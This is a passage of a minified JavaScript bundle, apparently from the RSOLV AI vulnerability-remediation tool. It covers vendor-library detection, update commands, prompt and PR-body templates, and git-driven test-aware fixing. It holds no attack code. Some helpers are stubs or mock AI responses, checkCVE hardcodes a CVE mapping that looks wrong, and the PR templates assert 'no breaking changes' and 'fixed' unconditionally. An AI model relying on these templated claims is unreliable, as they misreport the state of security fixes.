this.detector.identifyLibrary(X)}async checkCVE(X,Q){if(X.name==="jquery"&&Q.type==="XXE")return"CVE-2020-11022";return Q.cve}}class J4{async recommendUpdate(X,Q){let J=X.version,Y=await this.findFixedVersions(X,Q),W=this.getMinimumSafeVersion(X,Y),G=await this.checkBreakingChanges(J,W),H=[];if(H.push({type:"patch",command:this.getUpdateCommand(X,"patch"),risk:"low",notes:"Bug fixes only, no breaking changes"}),G===!1||G===null)H.push({type:"minor",command:this.getUpdateCommand(X,"minor"),risk:"medium",notes:"New features, backward compatible"});return H.push({type:"major",command:this.getUpdateCommand(X,"major"),risk:"high",notes:G?"May require code changes":"Check changelog for breaking changes"}),{severity:Q.severity||"MEDIUM",currentVersion:J,fixedVersions:Y,minimumSafeVersion:W,breakingChanges:G,updateStrategies:H}}async findFixedVersions(X,Q){if(X.name==="jquery"){if(X.version.startsWith("3.5.0"))return["3.5.1","3.6.0","3.6.4"]}if(X.name==="bootstrap"){if(X.version.startsWith("4."))return["4.6.2","5.0.0","5.3.0"]}let J=X.version.split(".");if(J.length>=3){let Y=parseInt(J[0]),W=parseInt(J[1]),G=parseInt(J[2]);return[`${Y}.${W}.${G+1}`,`${Y}.${W+1}.0`,"latest"]}return["latest"]}getMinimumSafeVersion(X,Q){if(Q.length>0&&Q[0]!=="latest")return Q[0];if(X.name==="jquery"&&X.version.startsWith("3.5.0"))return"3.5.1";if(X.name==="bootstrap"&&X.version.startsWith("4."))return"4.6.2";return"latest"}async checkBreakingChanges(X,Q){let J=this.parseVersion(X),Y=this.parseVersion(Q);if(!J||!Y)return;if(Y.major>J.major)return!0;return!1}parseVersion(X){if(X==="latest"||X==="unknown")return null;let Q=X.match(/^(\d+)\.(\d+)\.(\d+)/);if(Q)return{major:parseInt(Q[1]),minor:parseInt(Q[2]),patch:parseInt(Q[3])};return null}getUpdateCommand(X,Q){let J=X.packageManager||"npm",Y=X.name;if(J==="npm")switch(Q){case"patch":return`npm update ${Y}`;case"minor":return`npm install ${Y}@^${X.version}`;case"major":return`npm install ${Y}@latest`}return`${J} update ${Y}`}}class jG{async createIssue(X){let Q=this.generateTitle(X),J=this.generateBody(X),Y=this.generateLabels(X);return{title:Q,body:J,labels:Y,createsPR:!1}}generateTitle(X){return`\uD83D\uDD12 Update ${X.library.name} to fix ${X.type} vulnerability`}generateBody(X){let Q=[];if(Q.push("## \uD83D\uDCE6 Vendor Library Vulnerability Detected"),Q.push(""),Q.push(`**Library**: ${X.library.name}`),Q.push(`**Version**: ${X.library.version}`),Q.push(`**File**: \`${X.file}\``),Q.push(`**Vulnerability**: ${X.type}`),Q.push(`**Severity**: ${X.severity}`),Q.push(""),Q.push("### \uD83D\uDD12 Security Details"),X.description)Q.push(X.description);else Q.push(`A ${X.severity.toLowerCase()} severity ${X.type} vulnerability was detected in ${X.library.name}.`);if(Q.push(""),X.cve)Q.push(`**CVE**: ${X.cve}`),Q.push("");if(Q.push("### \uD83D\uDD27 Recommended Actions"),Q.push(""),Q.push("#### Option 1: Update Library (Recommended)"),Q.push("```bash"),Q.push(X.updateCommand||`npm update ${X.library.name}`),Q.push("```"),X.recommendedVersion)Q.push(`This will update to version ${X.recommendedVersion} which fixes this vulnerability.`);if(Q.push(""),X.workaround)Q.push("#### Option 2: Workaround"),Q.push(X.workaround),Q.push("");else Q.push("#### Option 2: Workaround"),Q.push("No safe workaround available. Library update required."),Q.push("");if(Q.push("#### Option 3: Accept Risk"),Q.push("If this is a false positive or the risk is acceptable for your use case, you can:"),Q.push("1. Add this file to `.rsolvignore`"),Q.push(`2. Mark this issue as "won't fix"`),Q.push(""),Q.push("### \uD83D\uDCDA References"),X.advisoryUrl)Q.push(`- [${X.library.name} Security Advisories](${X.advisoryUrl})`);if(Q.push(`- [NPM Audit Report](https://www.npmjs.com/advisories/search?q=${X.library.name})`),X.cve)Q.push(`- [CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=${X.cve})`);return Q.push(""),Q.push("###  Important Note"),Q.push("**Do not manually patch vendor library files.** Changes will be lost when the library updates."),Q.push(""),Q.push("---"),Q.push("*This issue was created by RSOLV vulnerability scanner*"),Q.push("*Vendor libraries require different handling than application code*"),Q.join(`
`)}generateLabels(X){let Q=["security","vendor-library","dependency-update"];if(Q.push(X.severity.toLowerCase()),X.type)Q.push(X.type.toLowerCase().replace(/_/g,"-"));if(X.library.name)Q.push(`lib:${X.library.name}`);return Q}}var PP=$1(()=>{qQ();MG()});class AV{detector;analyzer;handler;recommender;constructor(){this.detector=new AX,this.analyzer=new X4,this.handler=new Q4(this.detector,this.analyzer),this.recommender=new J4}async isVendorFile(X){return this.detector.isVendorFile(X)}async processVulnerability(X){console.log("[VendorDetectionIntegration] Processing vendor vulnerability");let Q=X.vendorFiles||[],J=await this.identifyLibrary(Q[0]),Y=await this.recommender.recommendUpdate(J,X);return{action:"issue_created",type:"vendor_update",library:J.name,currentVersion:J.version,recommendedVersion:Y.minimumSafeVersion,updateCommand:Y.updateStrategies[0]?.command,message:`Vendor library ${J.name} needs update from ${J.version} to ${Y.minimumSafeVersion}`,recommendation:Y}}async identifyLibrary(X){let Q=X.split("/"),J="unknown",Y="unknown";if(X.includes("jquery")){J="jquery";let W=X.match(/jquery[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("bootstrap")){J="bootstrap";let W=X.match(/bootstrap[.-]?([\d.]+)/);if(W)Y=W[1]}else if(X.includes("node_modules/")){let W=X.match(/node_modules\/([^/]+)/);if(W)J=W[1]}return{name:J,version:Y,path:X}}}var SP=$1(()=>{qQ();MG()});var EP={};Y9(EP,{VendorVulnerabilityHandler:()=>Q4,VendorIssueCreator:()=>jG,VendorDetector:()=>AX,VendorDetectionIntegration:()=>AV,UpdateRecommender:()=>J4,DependencyAnalyzer:()=>X4});var TP=$1(()=>{qQ();MG();SP();PP()});var kP={};Y9(kP,{ExtendedConversationIntegration:()=>_P,ExtendedConversationHandler:()=>RV});class RV{config;constructor(X){this.config={maxFilesPerConversation:20,maxTokensPerConversation:150000,conversationStrategy:"grouped",includeContext:!0,...X}}async processMultiFileVulnerability(X,Q,J){console.log(`[ExtendedConversation] Processing ${Q.length} files in single conversation`);let Y=await this.buildContext(X,Q),W=this.createConversationPlan(X,Q),G=await this.executeExtendedConversation(X,Y,W,J);return{success:!0,prUrl:(await this.generateComprehensivePR(G,X,J)).url,message:`Fixed ${Q.length} files in single PR using extended conversation`,stats:{filesProcessed:Q.length,conversationTurns:G.turns,tokensUsed:G.totalTokens||0}}}async buildContext(X,Q){let J={vulnerabilityType:X.type,severity:X.severity,description:X.description,files:[],relatedFiles:[],dependencies:new Map};for(let Y of Q){let W=await this.loadFileContent(Y),G=await this.analyzeDependencies(Y,W);J.files.push({path:Y,content:W,vulnerabilityLocations:X.locations?.filter((H)=>H.file===Y)}),J.dependencies.set(Y,G)}if(this.config.includeContext){let Y=await this.findRelatedFiles(Q,J.dependencies);for(let W of Y){let G=await this.loadFileContent(W);J.relatedFiles.push({path:W,content:G})}}return J}createConversationPlan(X,Q){let J={strategy:this.config.conversationStrategy,phases:[]};switch(this.config.conversationStrategy){case"sequential":J.phases=Q.map((G,H)=>({phase:H+1,description:`Fix vulnerability in ${G}`,files:[G],dependencies:[]}));break;case"grouped":let Y=this.groupRelatedFiles(Q,X);J.phases=Y.map((G,H)=>({phase:H+1,description:`Fix vulnerability in ${G.name}`,files:G.files,dependencies:G.dependencies}));break;case"prioritized":let W=this.prioritizeFiles(Q,X);J.phases=[{phase:1,description:"Fix critical vulnerabilities",files:W.critical},{phase:2,description:"Fix remaining vulnerabilities",files:W.remaining}];break}return J}async executeExtendedConversation(X,Q,J,Y){let W={turns:0,totalTokens:0,messages:[],fixes:[]},G=this.buildInitialPrompt(X,Q,J),H=await this.generateAIResponse(G);W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:H});for(let U of J.phases){console.log(`[ExtendedConversation] Processing phase ${U.phase}: ${U.description}`);let K=this.buildPhasePrompt(U,Q),B=W.messages.map((Z)=>`${Z.role==="user"?"User":"Assistant"}: ${Z.content}`).join(`

`)+`

User: `+K;H=await this.generateAIResponse(B),W.turns++,W.totalTokens+=1000,W.messages.push({role:"assistant",content:H});let q=this.extractFixes(H,U.files);if(W.fixes.push(...q),W.totalTokens>this.config.maxTokensPerConversation*0.8){console.log("[ExtendedConversation] Approaching token limit, finalizing conversation");break}}let $=this.buildReviewPrompt(W.fixes),z=W.messages.map((U)=>`${U.role==="user"?"User":"Assistant"}: ${U.content}`).join(`

`)+`

User: `+$;return H=await this.generateAIResponse(z),W.turns++,W.totalTokens+=1000,W}async generateComprehensivePR(X,Q,J){let Y=this.buildPRBody(X,Q,J);for(let G of X.fixes)await this.applyFix(G);return await this.createPullRequest({title:`[RSOLV] Fix ${Q.type} vulnerability across ${X.fixes.length} files`,body:Y,branch:`rsolv/fix-issue-${J}`,files:X.fixes.map((G)=>G.file)})}async loadFileContent(X){return""}async analyzeDependencies(X,Q){return[]}async findRelatedFiles(X,Q){return[]}groupRelatedFiles(X,Q){return[]}prioritizeFiles(X,Q){return{critical:[],remaining:[]}}buildInitialPrompt(X,Q,J){return`
You are fixing a ${X.type} vulnerability that affects ${Q.files.length} files.

VULNERABILITY DETAILS:
${X.description}

AFFECTED FILES:
${Q.files.map((Y)=>`- ${Y.path}`).join(`
`)}

PLAN:
We'll fix this systematically across all files in a single PR. 
${J.phases.map((Y)=>`Phase ${Y.phase}: ${Y.description}`).join(`
`)}

Let's start by understanding the vulnerability pattern across all files.
Please analyze the following files and identify the common vulnerability pattern:

${Q.files.slice(0,3).map((Y)=>`
File: ${Y.path}
\`\`\`
${Y.content.substring(0,1000)}
\`\`\`
`).join(`
`)}

What's the consistent pattern we need to fix across all files?
    `}buildPhasePrompt(X,Q){return`
Now let's fix the vulnerability in phase ${X.phase}: ${X.description}

Files to fix:
${X.files.join(`
`)}

Please provide the fixes for each file, ensuring consistency with previous fixes.
    `}buildReviewPrompt(X){return`
Let's review all ${X.length} fixes for consistency and completeness.

Please verify:
1. All fixes follow the same pattern
2. No security issues are introduced
3. The code remains functional
4. All vulnerable patterns are addressed

Provide a final summary of the changes.
    `}extractFixes(X,Q){return[]}buildPRBody(X,Q,J){return`
## \uD83D\uDD12 Security Fix: ${Q.type}

Fixes #${J}

### \uD83D\uDCCA Summary
- **Files Fixed**: ${X.fixes.length}
- **Vulnerability Type**: ${Q.type}
- **Severity**: ${Q.severity}
- **Conversation Turns**: ${X.turns}
- **Approach**: Extended conversation with comprehensive context

### \uD83D\uDD27 Changes Made
${X.fixes.map((Y)=>`-  ${Y.file||"Unknown file"}: Fixed vulnerability`).join(`
`)}

### \uD83E\uDDEA Testing
- All changes made in a single, coherent PR
- Consistent fix pattern applied across all files
- No breaking changes introduced

### \uD83D\uDCDD Technical Details
This fix was generated using an extended conversation approach, processing all ${X.fixes.length} files 
in a single Claude conversation rather than splitting into multiple PRs. This ensures consistency 
and maintains context across all changes.

---
\uD83E\uDD16 Fixed by RSOLV using Extended Conversation Approach
    `}async applyFix(X){}async createPullRequest(X){return{url:""}}async generateAIResponse(X){return console.log("[ExtendedConversation] Generating AI response for prompt length:",X.length),`Mock response for extended conversation. 
    This would contain the actual fix for the vulnerability across all files.
    The real implementation would use the AI provider to generate comprehensive fixes.`}}class _P{handler;constructor(X){this.handler=new RV(X)}shouldUseExtendedConversation(X){let Q=X.files?.length||X.filesToModify?.length||1;return Q>1&&Q<=20}async processWithExtendedConversation(X,Q){let J=X.files||X.filesToModify||[];console.log(`[ExtendedConversation] Processing ${J.length} files in single conversation`);try{let Y=await this.handler.processMultiFileVulnerability(X,J,Q);return{success:!0,action:"pr_created",prUrl:Y.prUrl,message:Y.message,stats:Y.stats}}catch(Y){return console.error("[ExtendedConversation] Error:",Y),{success:!1,action:"failed",error:Y instanceof Error?Y.message:String(Y),message:"Extended conversation failed, may need manual intervention"}}}}var vP={};Y9(vP,{hasFileInformation:()=>he1,extractFilesFromVulnerabilities:()=>fe1});function fe1(X,Q="unknown"){if(!Array.isArray(X)||X.length===0)return V.debug(`[${Q}] No vulnerabilities to extract files from`),[];let J=[];X.forEach((W,G)=>{let H=bP(W);if(H.length===0)V.warn(`[${Q}] Could not extract files from vulnerability ${G}:`,{vulnerabilityKeys:Object.keys(W),vulnerabilityType:W?.type,vulnerabilityString:JSON.stringify(W).substring(0,200)});else V.debug(`[${Q}] Extracted ${H.length} files from vulnerability ${G}:`,H);J.push(...H)});let Y=[...new Set(J)];return V.info(`[${Q}] Total files extracted from ${X.length} vulnerabilities:`,{totalFiles:Y.length,files:Y}),Y}function bP(X){if(!X||typeof X!=="object")return[];if("file"in X&&typeof X.file==="string")return[X.file];if("files"in X&&Array.isArray(X.files))return X.files.filter((Q)=>typeof Q==="string");if("path"in X&&typeof X.path==="string")return[X.path];if("filePath"in X&&typeof X.filePath==="string")return[X.filePath];if("location"in X&&typeof X.location==="object"){let Q=X.location;if(Q.file&&typeof Q.file==="string")return[Q.file];if(Q.path&&typeof Q.path==="string")return[Q.path]}if("filename"in X&&typeof X.filename==="string")return[X.filename];if("fileName"in X&&typeof X.fileName==="string")return[X.fileName];return[]}function he1(X){if(!X||typeof X!=="object")return!1;return bP(X).length>0}var xP=$1(()=>{y1()});import{exec as ye1}from"child_process";import{promisify as ge1}from"util";class LV{async runTest(X){try{let{stdout:Q,stderr:J}=await fP(X);return{passed:!0,output:Q+J}}catch(Q){return{passed:!1,output:Q.stdout+Q.stderr}}}async validate(){try{return await fP("npm test --version"),!0}catch{return!1}}}var fP;var hP=$1(()=>{fP=ge1(ye1)});function yP(X,Q,J){return`${J||`Fix the security vulnerability for issue ${X.issueId}: "${X.title}"

Issue Description:
${X.description}`}

The following test validates the expected behavior:
Test file: ${Q.testPath}
${Q.testFramework?`Framework: ${Q.testFramework}`:""}
${Q.testCommand?`Run command: ${Q.testCommand}`:""}

\`\`\`javascript
${Q.testContent}
\`\`\`

This test currently FAILS (RED phase) and must PASS after your fix.

Requirements:
1. Your fix must make this test pass
2. Preserve all existing behavioral contracts
3. Make minimal, incremental changes
4. The fix should address the root cause, not just the symptoms
`}var mP={};Y9(mP,{MitigationMode:()=>gP});import{execSync as x9,exec as me1}from"child_process";import*as a8 from"fs";import*as _X from"path";class gP{config;repoPath;phaseDataClient;constructor(X,Q,J){if(this.config=X,this.repoPath=Q||process.cwd(),this.phaseDataClient=J,X.environmentVariables&&typeof X.environmentVariables==="object")Object.entries(X.environmentVariables).forEach(([Y,W])=>{if(typeof W==="string")process.env[Y]=W,V.debug(`Applied environment variable: ${Y}`)})}getCurrentCommitSha(){try{return x9("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf8"}).trim()}catch(X){return V.warn(`Could not get current commit SHA: ${X}`),"unknown"}}async getValidationBranchName(X){return this.phaseDataClient?this.getFromApi(X):this.getFromLocalFile(X)}async getFromApi(X){try{let Q=`${X.repository.owner}/${X.repository.name}`,Y=(await this.phaseDataClient.retrievePhaseResults(Q,X.number,this.getCurrentCommitSha()))?.validate?.[`issue-${X.number}`]?.branchName;if(Y)V.info(`Found validation branch via API: ${Y}`);return Y}catch(Q){V.error(`API retrieval failed (production mode): ${Q}`);return}}getFromLocalFile(X){try{let Q=_X.join(this.repoPath,".rsolv","validation",`issue-${X.number}.json`);if(!a8.existsSync(Q))return;let J=JSON.parse(a8.readFileSync(Q,"utf8"));if(J.branchName)V.info(`Found validation branch in local file (testing mode): ${J.branchName}`);return J.branchName}catch(Q){V.warn(`Local file read failed (testing mode): ${Q}`);return}}async checkoutValidationBranch(X){let Q=this.getCurrentBranch();try{let J=await this.getValidationBranchName(X);if(!J)return V.info("No validation branch found, staying on current branch"),!1;let Y=this.doesLocalBranchExist(J);try{x9(`git fetch origin ${J}`,{cwd:this.repoPath,stdio:"pipe"}),V.info(`Fetched validation branch from remote: ${J}`)}catch(H){V.debug(`Could not fetch validation branch from remote: ${H}`)}let W=this.doesRemoteBranchExist(J);if(!Y&&!W)return V.info(`Validation branch ${J} does not exist locally or remotely, staying on current branch`),!1;if(Y)try{return x9(`git checkout ${J}`,{cwd:this.repoPath,stdio:"pipe"}),V.info(`Checked out local validation branch: ${J}`),!0}catch(H){V.warn(`Failed to checkout local branch ${J}: ${H}`);try{x9(`git checkout ${Q}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}}if(W)try{return x9(`git checkout -t origin/${J}`,{cwd:this.repoPath,stdio:"pipe"}),V.info(`Checked out remote validation branch: origin/${J}`),!0}catch(H){V.warn(`Failed to checkout validation branch from remote: ${H}`);try{x9(`git checkout ${Q}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}return!1}let G=this.doesLocalBranchExist(J);if(!Y&&G){V.warn(`Branch ${J} was created accidentally, cleaning up`);try{if(this.getCurrentBranch()!==Q)x9(`git checkout ${Q}`,{cwd:this.repoPath,stdio:"pipe"});x9(`git branch -D ${J}`,{cwd:this.repoPath,stdio:"pipe"}),V.info(`Deleted accidentally created branch: ${J}`)}catch(H){V.debug(`Could not clean up accidentally created branch: ${H}`)}}return!1}catch(J){V.error(`Error checking out validation branch for issue #${X.number}:`,J);try{x9(`git checkout ${Q}`,{cwd:this.repoPath,stdio:"pipe"})}catch{}return!1}}doesLocalBranchExist(X){try{return x9("git branch --list",{cwd:this.repoPath,encoding:"utf8"}).split(`
`).map((J)=>J.trim().replace(/^\*\s+/,"")).includes(X)}catch(Q){return V.debug(`Error checking local branches: ${Q}`),!1}}doesRemoteBranchExist(X){try{return x9("git branch -r",{cwd:this.repoPath,encoding:"utf8",stdio:"pipe"}).split(`
`).map((J)=>J.trim().replace(/^origin\//,"")).includes(X)}catch(Q){return V.debug(`Error checking remote branches: ${Q}`),!1}}async getValidationTests(X){let Q=[],J=[_X.join(this.repoPath,"tests"),_X.join(this.repoPath,"spec"),_X.join(this.repoPath,"__tests__"),_X.join(this.repoPath,"test"),_X.join(this.repoPath,".rsolv","tests")],Y=[/vulnerability_validation/i,/test_vulnerability/i,/vulnerability.*test/i,/validation.*spec/i,/validation.*test/i];for(let W of J){if(!a8.existsSync(W))continue;try{let G=a8.readdirSync(W);for(let H of G)if(Y.some(($)=>$.test(H)))Q.push(_X.join(W,H))}catch(G){V.debug(`Could not read test directory ${W}: ${G}`)}}return Q}async generateTestAwareFix(X){try{let Q=BG.checkVendorStatusFromValidation(this.repoPath,X.number);if(Q.isVendor)return{skipReason:"vendor_file",message:"Cannot patch vendor library - update required",vendorFiles:Q.files,branchCheckedOut:!1,testFilesFound:0,enhancedPrompt:void 0};let J=await this.checkoutValidationBranch(X),W=(await this.getValidationTests(X)).map((H)=>{try{return{path:H,content:a8.readFileSync(H,"utf-8")}}catch($){return V.warn(`Could not read test file ${H}:`,$),null}}).filter(Boolean),G=this.buildLegacyTestAwarePrompt(X,W);return V.info(`Generated test-aware mitigation prompt for issue #${X.number}`),V.info(`- Validation branch: ${J?"checked out":"not available"}`),V.info(`- Test files found: ${W.length}`),{branchCheckedOut:J,testFilesFound:W.length,enhancedPrompt:G,testContents:W}}catch(Q){throw V.error(`Test-aware fix generation failed for issue #${X.number}:`,Q),Q}}async prepareTestContext(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured for test-aware mitigation");let Q=await this.phaseDataClient.getPhaseTestInfo(X);return V.info(`Checking out validation branch: ${Q.branchName}`),await new Promise((Y,W)=>{me1(`git checkout ${Q.branchName}`,(G)=>{if(G)W(G);else Y()})}),{testContent:a8.readFileSync(Q.testPath,"utf-8"),testPath:Q.testPath,branchName:Q.branchName}}async buildTestAwarePrompt(X,Q){let J=await this.prepareTestContext(X);return yP({issueId:X,title:"",description:""},{testPath:J.testPath,testContent:J.testContent},Q)}async runPreFixTest(X){return this.runTestForIssue(X)}async runPostFixTest(X){return this.runTestForIssue(X)}async runTestForIssue(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured");let Q=await this.phaseDataClient.getPhaseTestInfo(X);return await new LV().runTest(Q.command)}async saveTestResults(X){if(!this.phaseDataClient)throw Error("PhaseDataClient not configured");await this.phaseDataClient.saveTestResults(X)}async calculateTrustScore(X,Q){if(!X&&Q)return 100;else if(X&&Q)return 50;else return 0}async runTestSafely(X){try{return await this.runTestForIssue(X)}catch(Q){return{passed:!1,error:Q.message}}}buildLegacyTestAwarePrompt(X,Q){let J=`
Fix the security vulnerability described in issue #${X.number}: "${X.title}"

Issue Description:
${X.body}
`;if(Q.length===0)return V.info("No validation tests found, using standard prompt"),J;let Y=`
VALIDATION TESTS AVAILABLE:
The following tests define the expected behavior and vulnerability patterns.
These tests currently FAIL on the vulnerable code and should PASS after your fix:

${Q.map((W)=>`
File: ${W.path}
\`\`\`javascript
${W.content}
\`\`\`
`).join(`
`)}

REQUIREMENTS:
1. Your fix must make these tests pass
2. Preserve all existing behavioral contracts tested
3. Make minimal, incremental changes
4. You can run these tests locally to validate your fix using: npm test

`;return J+Y}getCurrentBranch(){try{return x9("git branch --show-current",{cwd:this.repoPath,encoding:"utf8"}).trim()}catch(X){return V.warn(`Could not get current branch: ${X}`),"main"}}async createPRFromValidationBranch(X){try{let Q=this.getCurrentBranch();if(!Q.startsWith("rsolv/validate/"))return V.warn(`Not on validation branch (${Q}), cannot create PR with tests`),{success:!1,reason:"Not on validation branch"};if(x9("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"}).trim())x9("git add .",{cwd:this.repoPath}),x9(`git commit -m "Fix vulnerability for issue #${X.number}

 Generated with RSOLV three-phase workflow
\uD83E\uDDEA Includes validation tests from ${Q}"`,{cwd:this.repoPath}),V.info(`Committed fix to validation branch: ${Q}`);let Y=`\uD83D\uDD12 Fix security vulnerability: ${X.title}`,W=`
## Security Fix for Issue #${X.number}

**Vulnerability**: ${X.title}

### \uD83D\uDCCB Changes Made
- Fixed security vulnerability identified in issue #${X.number}
- Generated using RSOLV three-phase workflow (Scan  Validate  Mitigate)

### \uD83E\uDDEA Validation Tests Included
This PR includes validation tests that:
-  Prove the vulnerability existed (red tests)
-  Verify the fix resolves the issue (green tests)
-  Prevent regression

### \uD83D\uDD27 Test-Aware Fix Generation
The fix was generated using AI with access to validation tests, ensuring:
- Behavioral contracts are preserved
- Minimal, focused changes
- Test-driven approach

**Branch**: \`${Q}\`
**Issue**: #${X.number}

---
\uD83E\uDD16 Generated with [RSOLV](https://rsolv.app) - AI-powered vulnerability remediation
      `.trim();return V.info(`Creating PR from validation branch: ${Q}`),V.info(`PR Title: ${Y}`),{success:!0,branch:Q,title:Y,body:W,hasTests:!0,message:`PR ready to be created from validation branch ${Q}`}}catch(Q){return V.error("Failed to create PR from validation branch:",Q),{success:!1,error:Q instanceof Error?Q.message:String(Q)}}}}var uP=$1(()=>{y1();UV();hP()});function cP(X){if(!X||typeof X!=="object")return!1;let Q=X;return!!(Q.branchName||Q.redTests||Q.testResults||Q.vulnerabilities||Q.timestamp)}function lP(X){if(!X.validationData){V.debug(`[ValidationHelper] No validation data found for issue #${X.number}`);return}if(!cP(X.validationData)){V.warn(`[ValidationHelper] Invalid validation data structure for issue #${X.number}`);return}return V.info(`[ValidationHelper] Extracted validation data for issue #${X.number}`,{hasBranch:!!X.validationData.branchName,hasTests:!!X.validationData.redTests,hasResults:!!X.validationData.testResults,vulnerabilityCount:X.validationData.vulnerabilities?.length||0}),{branchName:X.validationData.branchName,redTests:X.validationData.redTests,testResults:X.validationData.testResults,vulnerabilities:X.validationData.vulnerabilities,timestamp:X.validationData.timestamp,commitHash:X.validationData.commitHash,confidence:X.validationData.confidence}}function pP(X){if(!X)return"none";let Q=[];if(X.branchName)Q.push(`branch: ${X.branchName}`);if(X.testResults){let{failed:J=0,total:Y=0}=X.testResults;Q.push(`tests: ${J} failed/${Y} total`)}if(X.vulnerabilities)Q.push(`vulns: ${X.vulnerabilities.length}`);if(X.timestamp)Q.push(`validated: ${new Date(X.timestamp).toISOString()}`);return Q.join(", ")}var dP=$1(()=>{y1()});class DV{generateLineLevelExplanation(X,Q){let J=`Line ${X.line}: ${this.getVulnerabilityDisplayName(X.type)} Vulnerability`,Y=this.generateLineLevelContent(X,Q),W=this.generateSecureExample(X.type,Q);return{tier:"line",vulnerabilityId:`${X.type}-${X.line}`,title:J,content:Y,secureExample:W,riskLevel:X.severity,lineNumber:X.line,codeSnippet:Q}}generateConceptLevelExplanation(X,Q){let J=`Understanding ${this.getVulnerabilityDisplayName(X)}`,Y=this.generateConceptLevelContent(X),W=this.getPreventionMethods(X),G=this.getAttackScenarios(X),H=this.getRelatedConcepts(X);return{tier:"concept",vulnerabilityType:X,title:J,content:Y,preventionMethods:W,attackScenarios:G,relatedConcepts:H,affectedVulnerabilities:Q.filter(($)=>$.type===X)}}generateBusinessLevelExplanation(X){let Q=this.calculateRiskScore(X),J=this.analyzeBusinessImpact(X),Y=this.analyzeComplianceImpact(X),W=this.determinePriorities(X),G=this.estimateTimeline(X);return{tier:"business",title:"Security Risk Assessment and Business Impact",content:this.generateBusinessLevelContent(X),businessImpact:J,complianceImpact:Y,riskScore:Q,priorities:W,timeline:G}}generateCompleteExplanation(X,Q){let J=[];for(let $ of X){let z=this.extractCodeSnippet($,Q);J.push(this.generateLineLevelExplanation($,z))}let W=[...new Set(X.map(($)=>$.type))].map(($)=>this.generateConceptLevelExplanation($,X)),G=this.generateBusinessLevelExplanation(X),H=this.generateSummary(X);return{lineLevelExplanations:J,conceptLevelExplanations:W,businessLevelExplanation:G,summary:H,timestamp:new Date().toISOString()}}formatAsMarkdown(X){if(X.tier==="line")return this.formatLineLevelMarkdown(X);else if(X.tier==="concept")return this.formatConceptLevelMarkdown(X);else return this.formatBusinessLevelMarkdown(X)}generateMarkdownReport(X){let Q=`# Security Vulnerability Explanation

`;Q+=`**Generated:** ${new Date(X.timestamp).toLocaleDateString()}

`,Q+=`## Summary

`,Q+=`- **Total Vulnerabilities:** ${X.summary.totalVulnerabilities}
`,Q+=`- **Estimated Fix Time:** ${X.summary.estimatedFixTime}
`,Q+=`- **Risk Score:** ${X.businessLevelExplanation.riskScore}/100

`,Q+=`## Line-Level Analysis

`;for(let J of X.lineLevelExplanations)Q+=this.formatLineLevelMarkdown(J)+`
`;Q+=`## Concept-Level Analysis

`;for(let J of X.conceptLevelExplanations)Q+=this.formatConceptLevelMarkdown(J)+`
`;return Q+=`## Business Impact Analysis

`,Q+=this.formatBusinessLevelMarkdown(X.businessLevelExplanation),Q}generateLineLevelContent(X,Q){return{sql_injection:"This line contains a SQL injection vulnerability because it uses string concatenation to build a database query. User input is directly embedded into the SQL statement without proper sanitization, allowing attackers to manipulate the query logic.",xss:"This line contains a cross-site scripting (XSS) vulnerability because it directly assigns user-controlled content to innerHTML without sanitization. This allows attackers to inject malicious scripts that execute in other users' browsers.",broken_access_control:"This endpoint lacks proper access control checks, allowing unauthorized users to access restricted functionality or data.",sensitive_data_exposure:"This line exposes sensitive data in plain text, making it vulnerable to unauthorized access or accidental disclosure."}[X.type]||`This line contains a ${X.type} vulnerability that poses security risks.`}generateSecureExample(X,Q){return{sql_injection:`const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId], callback);`,xss:`element.textContent = userInput;
// or use a sanitization library:
element.innerHTML = DOMPurify.sanitize(userInput);`,broken_access_control:`app.get("/admin/users", authenticateUser, authorizeAdmin, (req, res) => {
  // handler code
});`,sensitive_data_exposure:`const hashedPassword = await bcrypt.hash(password, 10);
// Never log sensitive data`}[X]||"Use secure coding practices for this vulnerability type."}generateConceptLevelContent(X){return{sql_injection:"SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL code into application queries, potentially gaining unauthorized access to sensitive data, modifying database contents, or executing administrative operations.",xss:"Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users. When successful, XSS attacks can access sensitive page content, session tokens, or other sensitive information, and can perform actions on behalf of the victim.",broken_access_control:"Broken access control occurs when applications fail to properly restrict what authenticated users are allowed to do. This can lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits."}[X]||`${X} represents a security vulnerability that requires attention.`}getPreventionMethods(X){return{sql_injection:["Use parameterized queries or prepared statements","Implement input validation and sanitization","Apply principle of least privilege for database accounts"],xss:["Output encoding and escaping","Input validation and sanitization","Content Security Policy (CSP) implementation"],broken_access_control:["Implement proper authentication mechanisms","Use role-based access control (RBAC)","Apply principle of least privilege"]}[X]||["Implement secure coding practices"]}getAttackScenarios(X){return{sql_injection:["Data extraction through UNION-based attacks","Authentication bypass via boolean-based attacks"],xss:["Script injection to steal session cookies","Phishing attacks through content manipulation"],broken_access_control:["Privilege escalation to admin functions","Horizontal privilege escalation to other users' data"]}[X]||["Various attack vectors possible"]}getRelatedConcepts(X){return{sql_injection:["Input validation","Database security","Query parameterization"],xss:["Content Security Policy","Input sanitization","Output encoding"],broken_access_control:["Authentication","Authorization","Session management"]}[X]||["Security fundamentals"]}calculateRiskScore(X){let Q=0;for(let J of X)switch(J.severity){case"critical":Q+=25;break;case"high":Q+=20;break;case"medium":Q+=15;break;case"low":Q+=10;break}return Math.min(100,Q)}analyzeBusinessImpact(X){let Q=X.some((J)=>J.severity==="critical"||J.severity==="high");return{dataLoss:Q?"High risk of sensitive data exposure or theft":"Moderate risk of data exposure",reputationalDamage:Q?"Severe impact on customer trust and brand reputation":"Potential minor impact on reputation",financialImpact:Q?"Significant costs from breaches, compliance fines, and recovery":"Minimal direct financial impact",operationalDisruption:Q?"Potential system compromise affecting business operations":"Limited operational impact"}}analyzeComplianceImpact(X){let Q=[];if(X.some((J)=>J.type==="sql_injection"||J.type==="xss"))Q.push("OWASP Top 10 compliance violation");if(X.some((J)=>J.type==="sensitive_data_exposure"))Q.push("GDPR/CCPA data protection requirements at risk");return 